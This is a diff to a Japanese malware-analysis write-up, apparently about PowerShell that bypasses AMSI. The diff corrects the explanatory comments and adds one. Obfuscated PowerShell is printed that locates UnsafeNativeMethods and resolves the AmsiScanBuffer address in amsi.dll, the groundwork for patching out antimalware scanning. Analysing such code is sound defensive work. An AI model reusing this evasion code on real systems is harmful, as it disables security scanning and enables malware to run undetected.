@@ -124,8 +124,8 @@ AMSIをバイバスるるためにPowershellが実行される
 ```powershell
 FUncTIon Get-PZ2zmpurexnDXVSxx {
     Param ($ljOHgifgLteNDYGV, $HWN81YY7isiEXwOd)
-# [AppDomain]::CurrentDomain.GetAssemblies()でロードされているアセンブリを取得し、System.dllがロードされている「Equals」メソッドで確認
-# ロードされているSystem.dllが「Microsoft.Win32.UnsafeNativeMethods」がどうか「.GetType」メソッドで確認
+# [AppDomain]::CurrentDomain.GetAssemblies()でロードされているアセンブリを取得し、System.dllがロードされているかどうか「Equals」メソッドで確認
+# ロードされているSystem.dllが「Microsoft.Win32.UnsafeNativeMethods」がどうか「GetType」メソッドで確認
     $IObr8mVbBcalgmD = ([AppDomain]::CurrentDomain.GetAssemblies() |
     WheRe-ObJecT { 
         $_.GlobalAssemblyCache -And $_.Location.Split(""+[cHaR](6474-6382)+"")[-1].Equals(""+[cHAR](8862-8779)+[CHaR](9611-9490)+[chaR](4982-4867)+[chaR]([bYtE] 0xb6-0x42)+[cHar](1707-1606)+[chaR](7297-7188)+[CHAR](1332-1286)+[cHaR]([Byte] 0xba-0x56)+[Char](7772-7664)+[char](6965-6857)+"")
@@ -174,6 +174,7 @@ FUncTIon Get-iy2kysa7yS {
     return $WQvsFMfB0c.CreateTYpe()
 }
 #jump
+# 「Get-PZ2zmpurexnDXVSxx $amsi.dll $AmsiScanBuffer」を実行
 [IntPtr]$jdemwXeK2wnWhB = Get-PZ2zmpurexnDXVSxx $(""+[char](2099-2002)+[ChAr](5453-5344)+[CHar]([bytE] 0xb5-0x42)+[Char]([Byte] 0xdf-0x76)+[chAr]([BYTE] 0x4d-0x1f)+[chAR](2502-2402)+[chAR](749-641)+[cHar]([BytE] 0x91-0x25)+"") $(""+[ChAr](3160-3095)+[cHaR]([BYtE] 0xdc-0x6f)+[cHar](6716-6601)+[chAR]([ByTe] 0xdf-0x76)+[Char](7170-7087)+[ChAr]([BYtE] 0xd5-0x72)+[cHAR](6847-6750)+[chaR](2526-2416)+[cHAr](3598-3532)+[char](7822-7705)+[ChAr](377-275)+[cHar](3259-3157)+[chaR](7660-7559)+[cHar](4473-4359)+"")
 #jump
 $N7IBEcG01XRRln = 0
